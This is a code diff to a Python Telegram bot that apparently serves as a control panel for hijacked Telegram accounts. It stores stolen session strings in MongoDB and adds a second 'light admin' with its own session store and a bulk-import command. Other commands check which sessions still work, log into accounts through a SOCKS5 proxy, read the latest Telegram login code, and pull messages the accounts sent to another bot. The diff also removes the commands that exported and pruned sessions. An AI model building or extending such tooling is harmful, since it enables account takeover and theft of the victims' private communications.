@@ -18,6 +18,7 @@ API_HASH = os.getenv("API_HASH")
 PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
+LA_ADMIN_ID = int(os.getenv("LA_ADMIN_ID"))  # Легкий админ
 
 PROXY_HOST = os.getenv("PROXY_HOST")
 PROXY_PORT = int(os.getenv("PROXY_PORT"))
@@ -28,23 +29,58 @@ proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
+light_sessions_col = db["light_sessions"]
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=PANEL_TOKEN)
 dp = Dispatcher(bot)
 
+def is_main_admin(uid):
+    return uid == ADMIN_ID
+
+def is_light_admin(uid):
+    return uid == LA_ADMIN_ID
+
+@dp.message_handler(commands=['addla'])
+async def add_light_admin_session(message: types.Message):
+    if not is_light_admin(message.from_user.id):
+        return
+
+    try:
+        data = json.loads(message.get_args())
+        if not isinstance(data, list):
+            raise ValueError("Формат должен быть списком JSON")
+
+        added = 0
+        for item in data:
+            phone = item.get("phone")
+            session = item.get("session")
+            if phone and session:
+                light_sessions_col.update_one(
+                    {"phone": phone},
+                    {"$set": {"phone": phone, "session": session}},
+                    upsert=True
+                )
+                added += 1
+
+        await message.reply(f"✅ Добавлено сессий: {added}")
+    except Exception as e:
+        await message.reply(f"❌ Ошибка при добавлении: {e}")
+
 @dp.message_handler(commands=['log'])
 async def cmd_log(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
+    if is_main_admin(message.from_user.id):
+        sessions = list(sessions_col.find({}))
+    elif is_light_admin(message.from_user.id):
+        sessions = list(light_sessions_col.find({}))
+    else:
         return
 
-    sessions = list(sessions_col.find({}))
     if not sessions:
-        await message.answer("❌ Нет сессий в базе данных.")
+        await message.answer("❌ Нет сессий.")
         return
 
-    await message.answer("🔍 Проверка всех сессий...")
-
+    await message.answer("🔍 Проверка сессий...")
     results = []
     for session in sessions:
         phone = session.get("phone")
@@ -72,63 +108,9 @@ async def cmd_log(message: types.Message):
     for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
         await message.answer(chunk)
 
-@dp.message_handler(commands=['loger'])
-async def cmd_loger(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-
-    sessions = list(sessions_col.find({}))
-    valid_sessions = []
-
-    for session in sessions:
-        phone = session.get("phone")
-        session_str = session.get("session")
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            if await client.is_user_authorized():
-                valid_sessions.append({"phone": phone, "session": session_str})
-        except:
-            pass
-        finally:
-            await client.disconnect()
-
-    if not valid_sessions:
-        await message.answer("❌ Нет валидных сессий.")
-        return
-
-    with open("valid_sessions.txt", "w") as f:
-        json.dump(valid_sessions, f, indent=2)
-
-    await message.answer_document(open("valid_sessions.txt", "rb"))
-
-@dp.message_handler(commands=['validel'])
-async def cmd_validel(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-
-    sessions = list(sessions_col.find({}))
-    deleted = 0
-
-    for session in sessions:
-        session_str = session.get("session")
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            if not await client.is_user_authorized():
-                sessions_col.delete_one({"_id": session["_id"]})
-                deleted += 1
-        except:
-            sessions_col.delete_one({"_id": session["_id"]})
-            deleted += 1
-        finally:
-            await client.disconnect()
-
-    await message.answer(f"🧹 Удалено невалидных сессий: {deleted}")
-
 @dp.message_handler(commands=['login'])
 async def cmd_login(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
         return
 
     args = message.get_args().strip()
@@ -136,7 +118,8 @@ async def cmd_login(message: types.Message):
         await message.reply("❗ Укажи номер телефона в формате: /login +391234567890")
         return
 
-    session = sessions_col.find_one({"phone": args})
+    session = (sessions_col.find_one({"phone": args}) if is_main_admin(message.from_user.id)
+               else light_sessions_col.find_one({"phone": args}))
     if not session:
         await message.reply("❌ Сессия с этим номером не найдена.")
         return
@@ -160,7 +143,6 @@ async def cmd_login(message: types.Message):
             await message.reply(f"📨 Последний код от Telegram:\n\n`{text}`", parse_mode="Markdown")
         else:
             await message.reply("⚠️ Нет сообщений от Telegram (777000).")
-
     except Exception as e:
         await message.reply(f"❌ Ошибка: {e}")
     finally:
@@ -168,7 +150,7 @@ async def cmd_login(message: types.Message):
 
 @dp.message_handler(commands=['fa'])
 async def cmd_fa(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
         return
 
     args = message.get_args().strip()
@@ -176,7 +158,8 @@ async def cmd_fa(message: types.Message):
         await message.reply("❗ Укажи номер телефона в формате: /fa +391234567890")
         return
 
-    session = sessions_col.find_one({"phone": args})
+    session = (sessions_col.find_one({"phone": args}) if is_main_admin(message.from_user.id)
+               else light_sessions_col.find_one({"phone": args}))
     if not session:
         await message.reply("❌ Сессия с этим номером не найдена.")
         return
@@ -184,7 +167,6 @@ async def cmd_fa(message: types.Message):
     client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
     try:
         await client.connect()
-        # Получаем последние 5 сообщений от юзера в бота @T686T_bot
         history = await client(GetHistoryRequest(
             peer='T686T_bot',
             limit=25,
@@ -202,12 +184,10 @@ async def cmd_fa(message: types.Message):
 
         output = "\n\n".join([f"✉️ {msg.message}" for msg in history.messages if msg.message])
         await message.reply(f"📤 Последние сообщения в @T686T_bot:\n\n{output}")
-
     except Exception as e:
         await message.reply(f"❌ Ошибка: {e}")
     finally:
         await client.disconnect()
-
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
